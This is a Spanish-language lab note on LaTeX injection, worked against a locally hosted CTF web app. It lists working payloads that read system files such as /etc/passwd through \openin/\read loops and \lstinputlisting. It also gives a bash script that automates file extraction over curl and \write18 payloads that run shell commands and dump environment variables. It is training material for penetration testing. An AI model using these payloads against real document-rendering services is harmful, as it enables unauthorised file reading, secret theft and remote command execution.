> LaTeX Injection is a type of injection attack where malicious content is injected into LaTeX documents. LaTeX is widely used for document preparation and typesetting, particularly in academia, for producing high-quality scientific and mathematical documents. Due to its powerful scripting capabilities, LaTeX can be exploited by attackers to execute arbitrary commands if proper safeguards are not in place.

## LaTeX
> LaTeX **es un sistema de composición tipográfica de alta calidad**. Incluye características especialmente diseñadas para la producción de documentación científica y ténica. LaTeX es el estándar para publicación de documentos científicos pero puede usarse para cualquier tipo de publicación.

- Generacion de documentos cientificos
- Curriculums

## Herramientas
```
apt install texlive-full -y
apt install zathura latexmk rubber -y
apt install poppler-utils
```

## Preparacion del entorno
- `xdg-mime query default application/pdf`
- `xdg-mime default zathura.desktop application/pdf`

- Iniciamos apache2
- `service apache2 start`
- `cd /var/www/html/`
- Descargamos `https://github.com/internetwache/Internetwache-CTF-2016/tasks/web90/code` - podemos usar la herramienta [[ghgrab]]
- `mv code/* .`
- `mv config.php.sample config.php`
- `chown www-data:www-data -R *`


## Inyecciones

### Leer archivos
- Para leer una sola linea
```
\input{/etc/passwd}
```
- En este laboratorio devuelve BLACKLISTED commands used porque en el codigo se sanitiza la entrada y si encuentra **input** o **include** da error

- Pero existe otra forma de leer una linea de un archivo
```
\newread\file
\openin\file=/etc/issue
\read\file to\line 
\text{\line} 
\closein\file
```
- Estamos leyendo la primer linea de `etc/issue` y pegandola en el pdf a crear
- Si queremos ver la segunda linea
```
\newread\file
\openin\file=/etc/passwd
\read\file to\line 
\read\file to\line 
\text{\line} 
\closein\file
```

- Si queremos multiples lineas
```
\newread\file
\openin\file=/etc/issue
\read\file to\lineA 
\read\file to\lineB 
\text{\lineA\lineB} 
\closein\file
```

- Podemos usar bucles para leer todas las lineas
```
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```
- El problema con esto es que hay caracteres que contiene `/etc/passwd` que dan error como '\_' o '#' y provoca que no cree el pdf

### Automatizacion para leer archivos
```bash
#/bin/bash

url="http://localhost/ajax.php"
read_line="%0A\read_line\text{\line}"
filename=$1

if [ $1 ]; then
  for i in $(seq 1 50); do
    file_to_download=$(curl -X POST $url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file$0A\openin\file=$filename$read_line%0A\text{\line}%0A\closein\file&template=blank" | grep -i download | awk 'NF{print $NF}')
    if [ $file_to_download ]; then
      wget $file_to_download
      file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
      pdftotext $file_to_convert
      file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt')
      echo $(cat $file_to_read | head -n 1)
      rm $file_to_convert
      rm $file_to_read
    fi
    read_line+="%0A\read_line\text{\line}"
  done
else
  echo -e "\n[!] Mal uso. Ejemplo $0 /etc/passwd \n"
fi
```
- El archivo debe estar en la carpeta `pdf`

### Mala sanitizacion
- En el archivo `ajax.php` que es donde se sanitiza la entrada y luego se crea el pdf esta esta linea
```
$CMD = "cd $COMPILEDIR && $PDFLATEX --shell-escape $USERID.tex";
```
- que ingresa al directorio de compilacion y luego ejecuta un programa `pdflatex` con el comando `--shell-escape`, ese comando lo que le dice es que ignore ciertas funciones como **write18**, que se utiliza para ejecutar comandos y no se recomienda temas de seguridad.
- Conociendo eso podemos ejecutar comandos en la siguiente seccion.

### Ejecutar comandos
- Podemos descubrir rutas, hay una en particular en este laboratorio `/compile` que archivos que se procesaron en la compilacion, por ejemplo el siguiente comando da un error pero nosotros lo guardamos en un archivo antes
```
\immediate\write18{cat /etc/passwd > output}
```
- Si voy a `localhost/compile` puedo listar los archivos y aparece **output** y lo puedo leer directamente

- Se puede cargar el archivo directamente
```
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```